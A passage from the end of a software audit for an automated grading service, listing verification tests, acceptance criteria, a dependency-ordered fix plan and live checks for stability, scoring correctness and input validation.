1. **Boot/packaging** (`V-01`): `rm -rf node_modules && npm ci --omit=dev && node server.js` must start all workers.
2. **Pool-exhaustion** (`V-05`): set `expectedUrl` to a dead host, enqueue 5 submissions, assert `GET /health/queues` recovers and `browserPool.getStats().available === 3`.
3. **Leak soak** (`V-06`,`V-25`,`V-27`): enqueue 100 missing-HTML repos; watch `lsof`/RSS/disk stay flat; `SIGTERM` leaves no zombie `chrome` processes (`pgrep -lf chrome`).
4. **Scoring correctness** (`V-07`): known rubric (1 dom w10 pass + 1 visual w20, stub model=15) → expect 25.
5. **Behavior same-tab** (`V-11`): a same-tab link passes in <5s.
6. **Security** (`V-02`,`V-03`): injection in `repoUrl` and metadata IP in `expectedUrl` are both rejected.
7. **Idempotency/timeout** (`V-08`,`V-19`): a hung student page is failed at budget and not double-processed.

### 6.3 Acceptance criteria (definition of production-ready)

- Fresh `--omit=dev` install boots and processes a job end-to-end.
- A 200-submission batch completes with: 0 leaked browsers/servers/zombie processes, flat memory/disk, no job processed twice.
- Deterministic re-run of the same submission yields the same score (±0).
- Malicious `repoUrl`/`expectedUrl` are rejected before any clone/navigation.
- Every failure is either retried (transient) exactly per policy or flagged-for-manual-review (permanent) — never a silent 0.

---

## 7. Suggested fix order (dependency-aware)

1. **Boot:** `V-01` → `V-31`/`V-32` (repo hygiene) → `V-37`.
2. **Stability/lifecycle:** `V-05`, `V-06`, `V-12`, `V-15`, `V-27`, `V-25`, `V-16`.
3. **Correctness/fairness:** `V-07`, `V-09`, `V-10`, `V-11`, `V-18`, `V-21`, `V-22`, `V-30`.
4. **Infra:** `V-08`, `V-13`, `V-14`, `V-19`.
5. **Security:** `V-02`, `V-03`, `V-04`, `V-36`, `V-26`, `V-28`.
6. **Polish:** `V-20`, `V-23`, `V-24`, `V-29`, `V-33`, `V-34`, `V-35`, `V-38`, `V-17`.

---

## 8. Live verification (needs Redis + Playwright + OpenAI)

All 38 fixes are committed and statically verified (`node --check`, import smoke, `npm run test:unit`). The following require a running stack and should be run before the first production cohort. Each maps to the §5 breaking-point it guards.

| Check | How | Pass criteria | Guards |
|---|---|---|---|
| **Boot/packaging** | `rm -rf node_modules && npm ci --omit=dev && npm start` | all workers init; `playwright install chromium` ran | V-01 / B1 |
| **Pool-exhaustion recovery** | point `expectedUrl` at a dead host; enqueue 5 jobs | jobs fail cleanly; `browserPool.getStats().available` returns to pool size; queue not wedged | V-05 / B2 |
| **Leak soak** | enqueue 100 missing-HTML repos | `lsof`/RSS/disk flat; after SIGTERM `pgrep -lf chrome` empty | V-06/V-25/V-27 / B3 |
| **Behavior same-tab** | rubric with an in-tab link | passes in <5s (not a 30s hang) | V-11 / B5 |
| **Deterministic score** | evaluate the same submission 3× | identical score each time | V-18 |
| **Single-attempt permanent fail** | submit an unparseable rubric / bad repo URL | exactly one failed attempt (UnrecoverableError), not 3 | V-17/V-09 |
| **Real timeout** | student page that hangs | job fails at `config.timeout`, not at lock-stall; not re-delivered | V-08/V-19 / B10 |
| **Auth/limits** | `POST /evaluate` without `x-api-key`; oversized batch | 401; 400 | V-04/V-28 / B12 |
| **SSRF/RCE** | `repoUrl` injection string; metadata-IP `expectedUrl` | both 400, no clone/navigation | V-02/V-03 / B11 |

Acceptance = §6.3.

---

*End of audit. Update checkboxes as you fix. Keep §5 (breaking-points) and §8 (live checks) current — together they are the on-call runbook for this evaluator.*
